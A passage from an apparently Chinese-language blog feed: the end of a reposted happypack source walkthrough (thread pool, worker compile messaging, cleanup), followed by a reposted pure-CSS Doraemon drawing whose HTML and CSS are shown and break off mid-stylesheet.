<p>这里第一步是给 <strong>rpcHandler</strong> 注册了当前的 loader 信息<br>第二步 通过<strong>getThread</strong>找到了对应的进程，调用了 <em>HappyThread.js</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;getThread</span><br><span class="line">function RoundRobinThreadPool(threads) &#123;</span><br><span class="line">  var lastThreadId &#x3D; 0;</span><br><span class="line"></span><br><span class="line">  return function getThread() &#123;</span><br><span class="line">    var threadId &#x3D; lastThreadId;</span><br><span class="line"></span><br><span class="line">    lastThreadId++;</span><br><span class="line"></span><br><span class="line">    if (lastThreadId &gt;&#x3D; threads.length) &#123;</span><br><span class="line">      lastThreadId &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return threads[threadId];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RoundRobinThreadPool 这里的递增取对应进程很巧妙<br>最终是由 <em>HappyThread.js</em> 给子进程发了一个 <code>COMPILE</code> 消息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; HappyThread.js</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @param &#123;Object&#125; params</span><br><span class="line"> * @param &#123;String&#125; params.compiledPath</span><br><span class="line"> * @param &#123;Object&#125; params.loaderContext</span><br><span class="line"> *</span><br><span class="line"> * @param &#123;Function&#125; done</span><br><span class="line"> *&#x2F;</span><br><span class="line">compile: function(params, done) &#123;</span><br><span class="line">  var messageId &#x3D; generateMessageId();</span><br><span class="line"></span><br><span class="line">  callbacks[messageId] &#x3D; done;</span><br><span class="line"></span><br><span class="line">  send(&#123;</span><br><span class="line">    id: messageId,</span><br><span class="line">    name: &#39;COMPILE&#39;,</span><br><span class="line">    data: params,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>这里的 messageId 是个从 0 开始的递增数字，完成回调方法的存储注册，方便完成编译之后找到回调方法传递信息回主进程。同时在 thread 这一层，也是将参数透传给子进程执行编译。</p>
<p>子进程收到消息<br><em>HappyWorkerChannel.js</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COMPILE: function(message) &#123;</span><br><span class="line">    getWorker(message.data.loaderContext.compilerId)</span><br><span class="line">        .compile(message.data, function(err, data) &#123;</span><br><span class="line">          send(&#123;</span><br><span class="line">            id: message.id,</span><br><span class="line">            name: &#39;COMPILED&#39;,</span><br><span class="line">            error: err,</span><br><span class="line">            data: data</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>收到消息后，调用 <strong>worker.compile</strong><br><em>HappyWorker.js</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @param  &#123;Object&#125; params</span><br><span class="line"> * @param  &#123;Object&#125; params.loaderContext</span><br><span class="line"> * @param  &#123;String&#125; params.loaderContext.sourceCode</span><br><span class="line"> * @param  &#123;?String|?Object&#125; params.loaderContext.sourceMap</span><br><span class="line"> * @param  &#123;Array.&lt;String&gt;&#125; params.loaders</span><br><span class="line"> * @param  &#123;Function&#125; done</span><br><span class="line"> *&#x2F;</span><br><span class="line">HappyWorker.prototype.compile &#x3D; function(params, done) &#123;</span><br><span class="line">  assert(typeof params.loaderContext.resourcePath &#x3D;&#x3D;&#x3D; &#39;string&#39;,</span><br><span class="line">    &quot;ArgumentError: expected params.sourcePath to contain path to the source file.&quot;</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(Array.isArray(params.loaders),</span><br><span class="line">    &quot;ArgumentError: expected params.loaders to contain a list of loaders.&quot;</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  applyLoaders(&#123;</span><br><span class="line">    compiler: this._compiler,</span><br><span class="line">    loaders: params.loaders,</span><br><span class="line">    loaderContext: params.loaderContext,</span><br><span class="line">  &#125;, params.loaderContext.sourceCode, params.loaderContext.sourceMap, function(err, source, sourceMap) &#123;</span><br><span class="line">    if (err) &#123;</span><br><span class="line">      done(ErrorSerializer.serialize(err))</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      done(null, &#123;</span><br><span class="line">        compiledSource: source,</span><br><span class="line">        compiledMap: SourceMapSerializer.serialize(sourceMap)</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在 HappyWorker.js 中的<code>compile</code>方法中，调用<code>applyLoaders</code>进行 loader 方法执行。<code>applyLoaders</code>是<code>happypack</code>中对<code>webpack</code>中 loader 执行过程进行模拟，对应 NormalModuleMixin.js 中的<a href="https://github.com/webpack/core/blob/master/lib/NormalModuleMixin.js#L49"><code>doBuild</code></a>方法。完成对文件的字符串处理编译。</p>
<p>根据<code>err</code>判断是否成功。如果判断成功，则将对应文件的编译后内容写入之前传递进来的<code>compiledPath</code>,反之，则会把错误内容写入。</p>
<p>关于 <strong>loader</strong> 内部的执行机制可以点<a href="https://segmentfault.com/a/1190000021037299?utm_source=tag-newest#">这里</a></p>
<h4 id="编译结束"><a href="#编译结束" class="headerlink" title="编译结束"></a>编译结束</h4><p>当 webpack 整体编译流程结束后， happypack 开始进行一些善后工作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; HappyPlugin.js</span><br><span class="line"></span><br><span class="line">compiler.plugin(&#39;done&#39;, that.stop.bind(that));</span><br><span class="line"></span><br><span class="line">HappyPlugin.prototype.stop &#x3D; function() &#123;</span><br><span class="line">  if (this.config.cache) &#123;</span><br><span class="line">    this.cache.save();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  this.threadPool.stop();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><p>结合webpack的编译，整体流程可以参考下图<br><img src="https://upload-images.jianshu.io/upload_images/10024246-3f564e9018081005.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>happypack 源码阅读需要对 webpack 有一定的了解，阅读难度主要在于webpack相关的api的了解。有兴趣的同学可以一起讨论</p>
<blockquote>
<p>转载自<a href="https://segmentfault.com/a/1190000021037299?utm_source=tag-newest">https://segmentfault.com/a/1190000021037299?utm_source=tag-newest</a></p>
</blockquote>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>CSS3测试</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/CSS3%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e54779fc756f5400.gif?imageMogr2/auto-orient/strip"><br>上边的“图像”并非图片，而是纯CSS 。转载外部网站<a href="https://purecss3.net/doraemon/doraemon_css3.html">点这里</a>由于被墙，源代码copy如下：</p>
<h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!-- saved from url&#x3D;(0048)https:&#x2F;&#x2F;purecss3.net&#x2F;doraemon&#x2F;doraemon_css3.html --&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;ja&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;title&gt;CSS3 ドラえもん - Pure CSS Design&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;国民的キャラクターである「ドラえもん」を画像を使わずCSS3だけで書いてみた！&quot;&gt;</span><br><span class="line">	&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;CSS3,ドラえもん,CSS,Doraemon,ドラ&quot;&gt;</span><br><span class="line">	&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;.&#x2F;CSS3 ドラえもん - Pure CSS Design_files&#x2F;dora3.css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id&#x3D;&quot;doraemon&quot;&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;face&quot;&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;head_light&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;eyes&quot;&gt;</span><br><span class="line">				&lt;div class&#x3D;&quot;eye eye_left&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div class&#x3D;&quot;black_eye black_left&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">				&lt;div class&#x3D;&quot;eye eye_right&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div class&#x3D;&quot;black_eye black_right&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;base&quot;&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;base_white&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;nose&quot;&gt;</span><br><span class="line">					&lt;div id&#x3D;&quot;nose_light&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;nose_line&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;mouth&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;mouth_rewrite&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;firefox_mouth&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">				&lt;div class&#x3D;&quot;whiskers whi_right_top rotate160&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div class&#x3D;&quot;whiskers whi_right&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div class&#x3D;&quot;whiskers whi_right_bottom rotate20&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">				&lt;div class&#x3D;&quot;whiskers whi_left_top rotate20&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div class&#x3D;&quot;whiskers whi_left&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div class&#x3D;&quot;whiskers whi_left_bottom rotate160&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;choker&quot;&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;belt&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;bell&quot;&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;bell_line&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;bell_circle&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;bell_under&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;bell_light&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;body&quot;&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;doutai&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;base_white2 doutai_center&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;pocket&quot;&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;circle&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">				&lt;div id&#x3D;&quot;circle_rewrite&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;hand_right&quot;&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;arm_right&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;hand_circle hand_right&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;arm_rewrite_right&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;hand_left&quot;&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;arm_left&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;hand_circle hand_left&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;arm_rewrite_left&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;foot&quot;&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;foot_left&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;foot_right&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">			&lt;div id&#x3D;&quot;foot_rewrite&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;shadow_doutai_arm&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;shadow_doutai_left&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;shadow_doutai_right&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;shadow_belt&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">	&lt;div id&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">		&lt;p&gt;These are Samples drawn with CSS3 only, with no images. by &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;twitter.com&#x2F;shop_dd&quot;</span><br><span class="line">				title&#x3D;&quot;Twitter shopdd&quot;&gt;@shop_dd&lt;&#x2F;a&gt;&lt;br&gt;Return to &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;purecss3.net&#x2F;&quot;&gt;Pure CSS</span><br><span class="line">				Design&lt;&#x2F;a&gt;.&amp;nbsp;&amp;nbsp;Read about &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;shopdd.jp&#x2F;blog-entry-932.html&quot; target&#x3D;&quot;_blank&quot;&gt;the</span><br><span class="line">				CSS3 Doraemon on shop DD&lt;&#x2F;a&gt; . &lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;audio controls&#x3D;&quot;controls&quot; style&#x3D;&quot;display: none;&quot;&gt;&lt;&#x2F;audio&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">	#yddContainer &#123;</span><br><span class="line">		display: block;</span><br><span class="line">		font-family: Microsoft YaHei;</span><br><span class="line">		position: relative;</span><br><span class="line">		width: 100%;</span><br><span class="line">		height: 100%;</span><br><span class="line">		top: -4px;</span><br><span class="line">		left: -4px;</span><br><span class="line">		font-size: 12px;</span><br><span class="line">		border: 1px solid</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddTop &#123;</span><br><span class="line">		display: block;</span><br><span class="line">		height: 22px</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddTopBorderlr &#123;</span><br><span class="line">		display: block;</span><br><span class="line">		position: static;</span><br><span class="line">		height: 17px;</span><br><span class="line">		padding: 2px 28px;</span><br><span class="line">		line-height: 17px;</span><br><span class="line">		font-size: 12px;</span><br><span class="line">		color: #5079bb;</span><br><span class="line">		font-weight: bold;</span><br><span class="line">		border-style: none solid;</span><br><span class="line">		border-width: 1px</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddTopBorderlr .ydd-sp &#123;</span><br><span class="line">		position: absolute;</span><br><span class="line">		top: 2px;</span><br><span class="line">		height: 0;</span><br><span class="line">		overflow: hidden</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	.ydd-icon &#123;</span><br><span class="line">		left: 5px;</span><br><span class="line">		width: 17px;</span><br><span class="line">		padding: 0px 0px 0px 0px;</span><br><span class="line">		padding-top: 17px;</span><br><span class="line">		background-position: -16px -44px</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	.ydd-close &#123;</span><br><span class="line">		right: 5px;</span><br><span class="line">		width: 16px;</span><br><span class="line">		padding-top: 16px;</span><br><span class="line">		background-position: left -44px</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddKeyTitle &#123;</span><br><span class="line">		float: left;</span><br><span class="line">		text-decoration: none</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddMiddle &#123;</span><br><span class="line">		display: block;</span><br><span class="line">		margin-bottom: 10px</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	.ydd-tabs &#123;</span><br><span class="line">		display: block;</span><br><span class="line">		margin: 5px 0;</span><br><span class="line">		padding: 0 5px;</span><br><span class="line">		height: 18px;</span><br><span class="line">		border-bottom: 1px solid</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	.ydd-tab &#123;</span><br><span class="line">		display: block;</span><br><span class="line">		float: left;</span><br><span class="line">		height: 18px;</span><br><span class="line">		margin: 0 5px -1px 0;</span><br><span class="line">		padding: 0 4px;</span><br><span class="line">		line-height: 18px;</span><br><span class="line">		border: 1px solid;</span><br><span class="line">		border-bottom: none</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	.ydd-trans-container &#123;</span><br><span class="line">		display: block;</span><br><span class="line">		line-height: 160%</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	.ydd-trans-container a &#123;</span><br><span class="line">		text-decoration: none;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddBottom &#123;</span><br><span class="line">		position: absolute;</span><br><span class="line">		bottom: 0;</span><br><span class="line">		left: 0;</span><br><span class="line">		width: 100%;</span><br><span class="line">		height: 22px;</span><br><span class="line">		line-height: 22px;</span><br><span class="line">		overflow: hidden;</span><br><span class="line">		background-position: left -22px</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	.ydd-padding010 &#123;</span><br><span class="line">		padding: 0 10px</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddWrapper &#123;</span><br><span class="line">		color: #252525;</span><br><span class="line">		z-index: 10001;</span><br><span class="line">		background: url(chrome-extension:&#x2F;&#x2F;eopjamdnofihpioajgfdikhhbobonhbb&#x2F;ab20.png);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddContainer &#123;</span><br><span class="line">		background: #fff;</span><br><span class="line">		border-color: #4b7598</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddTopBorderlr &#123;</span><br><span class="line">		border-color: #f0f8fc</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddWrapper .ydd-sp &#123;</span><br><span class="line">		background-image: url(chrome-extension:&#x2F;&#x2F;eopjamdnofihpioajgfdikhhbobonhbb&#x2F;ydd-sprite.png)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddWrapper a,</span><br><span class="line">	#yddWrapper a:hover,</span><br><span class="line">	#yddWrapper a:visited &#123;</span><br><span class="line">		color: #50799b</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddWrapper .ydd-tabs &#123;</span><br><span class="line">		color: #959595</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	.ydd-tabs,</span><br><span class="line">	.ydd-tab &#123;</span><br><span class="line">		background: #fff;</span><br><span class="line">		border-color: #d5e7f3</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddBottom &#123;</span><br><span class="line">		color: #363636</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	#yddWrapper &#123;</span><br><span class="line">		min-width: 250px;</span><br><span class="line">		max-width: 400px;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="css"><a href="#css" class="headerlink" title="css"></a>css</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">	background:#fff;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#doraemon&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	margin:50px;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#head_light&#123;</span><br><span class="line">	width:50px;</span><br><span class="line">	height:50px;</span><br><span class="line">	transform: rotate(20deg);</span><br><span class="line">		-webkit-transform: rotate(20deg);</span><br><span class="line">		-moz-transform: rotate(20deg);</span><br><span class="line">		-o-transform: rotate(20deg);</span><br><span class="line">		-ms-transform: rotate(20deg);</span><br><span class="line">	box-shadow:80px 20px 50px #fff;</span><br><span class="line">		-webkit-box-shadow:80px 20px 55px #fff;</span><br><span class="line">		-moz-box-shadow:80px 20px 50px #fff;</span><br><span class="line">	border-radius:45px;</span><br><span class="line">		-webkit-border-radius:45px;</span><br><span class="line">		-moz-border-radius:60px;</span><br><span class="line">	position:absolute;</span><br><span class="line">	top:-20px;</span><br><span class="line">	left:170px;</span><br><span class="line">	opacity:0.5</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#face&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	width:310px;</span><br><span class="line">	height:300px;</span><br><span class="line">	border-radius:146px;</span><br><span class="line">		-webkit-border-radius:146px;</span><br><span class="line">		-moz-border-radius:146px;</span><br><span class="line">	background:#07beea;	</span><br><span class="line">	background: linear-gradient(right top, #fff,#07beea 20%, #10a6ce 73% ,#000 95% ,#000 155%); </span><br><span class="line">		background: -webkit-linear-gradient(right top, #fff,#07beea 20%, #10a6ce 73% ,#000 95% ,#000 155%); </span><br><span class="line">		background: -moz-linear-gradient(right top, #fff,#07beea 20%, #10a6ce 73% ,#000 95% ,#000 155%); </span><br><span class="line">		background: -o-linear-gradient(right top, #fff,#07beea 20%, #10a6ce 73% ,#000 95% ,#000 155%); </span><br><span class="line">		background: -ms-linear-gradient(right top, #fff,#07beea 20%, #10a6ce 73% ,#000 95% ,#000 155%);  </span><br><span class="line">	border:#333 2px solid;</span><br><span class="line">	top:-15px;</span><br><span class="line">	box-shadow:-5px 10px 15px rgba(0,0,0,0.45);</span><br><span class="line">		-webkit-box-shadow:-5px 10px 15px rgba(0,0,0,0.45);</span><br><span class="line">		-moz-box-shadow:-5px 10px 15px rgba(0,0,0,0.45);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#base&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	top:-5px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#base_white&#123;</span><br><span class="line">	position:absolute;</span><br><span class="line">	border:#000 2px solid;</span><br><span class="line">	width:264px;</span><br><span class="line">	height:196px;</span><br><span class="line">	border-radius: 150px 150px;</span><br><span class="line">		-webkit-border-radius: 150px 150px;</span><br><span class="line">		-moz-border-radius: 150px 150px;</span><br><span class="line">	background:#FFF;</span><br><span class="line">	background: linear-gradient(right top, #fff,#fff 75%, #eee 83%,#999 90%,#444 95%, #000); </span><br><span class="line">		background: -webkit-linear-gradient(right top, #fff,#fff 75%, #eee 83%,#999 90%,#444 95%, #000); </span><br><span class="line">		background: -moz-linear-gradient(right top, #fff,#fff 75%, #eee 83%,#999 90%,#444 95%, #000); </span><br><span class="line">		background: -o-linear-gradient(right top, #fff,#fff 75%, #eee 83%,#999 90%,#444 95%, #000); </span><br><span class="line">		background: -ms-linear-gradient(right top, #fff,#fff 75%, #eee 83%,#999 90%,#444 95%, #000); </span><br><span class="line">	z-index:1;</span><br><span class="line">	top:85px;</span><br><span class="line">	left:22px;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#eyes&#123;</span><br><span class="line">	position:relative;</span><br><span class="line">	top:-5px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div.eye&#123;</span><br><span class="line">	position:absolute;</span><br><span class="line">	border-radius: 35px 35px;</span><br><span class="line">		-webkit-border-radius: 35px 35px;</span><br><span class="line">		-moz-border-radius: 35px 35px;</span><br><span class="line">	border:2px solid #000;</span><br><span class="line">	width:72px;</span><br><span class="line">	height:83px;</span><br><span class="line">	z-index:20;</span><br><span class="line">	background:#fff;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div.black_eye&#123;</span><br><span class="line">	position:absolute;</span><br><span class="line">	width:15px;</span><br><span class="line">	height:15px;</span><br><span class="line">	border-radius:10px;</span><br><span class="line">		-webkit-border-radius:10px;</span><br><span class="line">		-moz-border-radius:10px;</span><br><span class="line">	background:#333;</span><br><span class="line">	z-index:21;</span><br><span class="line">		-webkit-animation-name: cate;</span><br><span class="line">		-webkit-animation-duration: 10s;</span><br><span class="line">		-webkit-animation-timing-function: linear;</span><br><span class="line">		-webkit-animation-iteration-count: 200;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@-webkit-keyframes cate&#123;</span><br><span class="line">	0%&#123;</span><br><span class="line">		margin:0 0 0 0;</span><br><span class="line">	&#125;</span><br><span class="line">	80%	&#123;</span><br><span class="line">		margin:0px 0 0 0;</span><br><span class="line">	&#125;</span><br><span class="line">	85%	&#123;</span><br><span class="line">		margin:-20px 0 0 0;</span><br><span class="line">	&#125;</span><br><span class="line">	90%&#123;</span><br><span class="line">		margin:0 0 0 0;</span><br><span class="line">	&#125;</span><br><span class="line">	93%&#123;</span><br><span class="line">		margin:0 0 0 7px;</span><br><span class="line">	&#125;</span><br><span class="line">	96%&#123;</span><br><span class="line">		margin:0 0 0 0;</span><br><span class="line">	&#125;</span><br><span class="line">	100%&#123;</span><br><span class="line">		margin:0 0 0 0;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div.black_left&#123;</span><br><span class="line">	top:100px;</span><br><span class="line">	left:130px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div.black_right&#123;</span><br><span class="line">	top:100px;</span><br><span class="line">	left:170px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div.eye_left&#123;</span><br><span class="line">	top:45px;</span><br><span class="line">	left:82px;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div.eye_right&#123;</span><br><span class="line">	top:45px;</span><br><span class="line">	left:156px;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#nose&#123;</span><br><span class="line">	width:32px;</span><br><span class="line">	height:32px;</span><br><span class="line">	border:2px solid #000;</span><br><span class="line">	border-radius:50px;</span><br><span class="line">		-webkit-border-radius:50px;</span><br><span class="line">		-moz-border-radius:50px;</span><br><span class="line">	background:#c93e00;</span><br><span class="line">	position:absolute;</span><br><span class="line">	top:117px;</span><br><span class="line">	left:139px;</span><br><span class="line">	z-index:30;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#nose_light&#123;</span><br><span class="line">	width:10px;</span><br><span class="line">	height:10px;</span><br><span class="line">	border-radius:5px;</span><br><span class="line">		-webkit-border-radius:5px;</span><br><span class="line">		-moz-border-radius:5px;</span><br><span class="line">	box-shadow:19px 8px 5px #fff;</span><br><span class="line">		-webkit-box-shadow:19px 8px 5px #fff;</span><br><span class="line">		-moz-box-shadow:19px 8px 5px #fff;</span><br><span class="line">	position:relative;</span><br><span class="line">	top:0px;</span><br><span class="line">	left:0px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#nose_line&#123;</span><br><span class="line">	background:#333;</span><br><span class="line">	width:3px;</span><br><span class="line">	height:100px;</span><br><span class="line">	top:140px;</span><br><span class="line">	left:155px;</span><br><span class="line">	position:absolute;</span><br><span class="line">		z-index:20;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#mouth&#123;</span><br><span class="line">	width:240px;</span><br><span class="line">	height:240px;</span><br><span class="line">	border-bottom:3px solid #333;</span><br><span class="line">	border-radius:120px;</span><br><span class="line">		-webkit-border-radius:120px;</span><br><span class="line">		-moz-border-radius:120px;</span><br><span class="line">	position:absolute;</span><br><span class="line">	top:0px;</span><br><span class="line">	left:35px;</span><br><span class="line">	z-index:50;</span><br><span class="line">	clip:rect(205px auto auto auto);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.whiskers&#123;</span><br><span class="line">	background:#333;</span><br><span class="line">	height:2px;</span><br><span class="line">	width:60px;</span><br><span 